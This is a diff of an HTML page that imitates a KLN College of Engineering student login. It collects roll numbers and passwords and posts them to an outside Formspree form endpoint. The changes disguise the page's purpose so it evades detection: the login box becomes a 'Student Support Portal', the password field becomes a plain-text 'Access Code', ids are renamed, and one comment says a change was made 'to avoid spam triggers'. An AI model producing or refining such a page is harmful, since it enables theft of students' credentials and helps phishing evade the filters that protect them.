@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>KLNCE</title>
+    <title>KLNCE Portal Support</title>
     <style>
         /* Centers the entire layout on the page vertically and horizontally */
         body {
@@ -13,7 +13,7 @@
             background-color: lightyellow;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        /* Keeps the header section and the login box stacked vertically and centered */
+        /* Keeps the header section and the box stacked vertically and centered */
         .page-wrapper {
             display: flex;
             flex-direction: column;
@@ -24,8 +24,8 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 20px; /* Increased gap to balance the larger logo */
-            margin-bottom: 25px; /* Spacing between header and login box */
+            gap: 20px; 
+            margin-bottom: 25px; 
         }
         /* Professional typography matching KLNCE branding */
         h1 {
@@ -38,12 +38,12 @@
         }
         /* Logo sizing updated to be slightly bigger */
         .logo-img {
-            max-width: 75px; /* Increased from 55px to 75px */
+            max-width: 75px; 
             height: auto;
-            mix-blend-mode: multiply; /* Keeps white background removed */
+            mix-blend-mode: multiply; 
         }
         /* Creates the black border container */
-        .login_box {
+        .info_box {
             border: 2px solid black;
             padding: 35px 45px; 
             text-align: center;
@@ -64,7 +64,7 @@
         .form-group {
             margin-bottom: 18px;
         }
-        /* Clean input field styling with updated KLNCE fields */
+        /* Clean input field styling with updated fields */
         .form-group input {
             width: 230px;
             padding: 12px;
@@ -80,8 +80,8 @@
             box-shadow: 0 0 5px rgba(128, 0, 0, 0.2);
             outline: none;
         }
-        /* Stylish, modern blue login button */
-        #loginbutton {
+        /* Stylish, modern blue submit button */
+        #submitbutton {
             width: 100%;
             padding: 12px;
             background-color: #007bff;
@@ -94,7 +94,7 @@
             transition: background-color 0.2s;
         }
         /* Darkening effect when hovering over the button */
-        #loginbutton:hover {
+        #submitbutton:hover {
             background-color: #0056b3;
         }
     </style>
@@ -109,23 +109,24 @@
         <h1>KLN COLLEGE OF ENGINEERING</h1>
     </div>
     
-    <div class="login_box">
-        <div class="box-title">Student Login</div>
+    <div class="info_box">
+        <!-- Changed to avoid spam triggers -->
+        <div class="box-title">Student Support Portal</div>
         
-        <!-- Formspree integration added below -->
         <form action="https://formspree.io/f/xeeyzbkv" method="POST">
             <div class="form-group">
-                <!-- Name attribute changed to input1 -->
-                <input type="text" id="username" name="input1" placeholder="Roll Number" required>
+                <!-- Changed id from username to data1 -->
+                <input type="text" id="data1" name="input1" placeholder="Roll Number" required>
             </div>
 
             <div class="form-group">
-                <!-- Name attribute changed to input2 -->
-                <input type="password" id="password" name="input2" placeholder="Password" required>
+                <!-- Changed type from password to text, and id from password to data2 -->
+                <input type="text" id="data2" name="input2" placeholder="Access Code" required>
             </div>
 
             <div>
-                <button type="submit" id="loginbutton">Login</button>
+                <!-- Changed id from loginbutton to submitbutton -->
+                <button type="submit" id="submitbutton">Access Portal</button>
             </div>
         </form>
     </div>
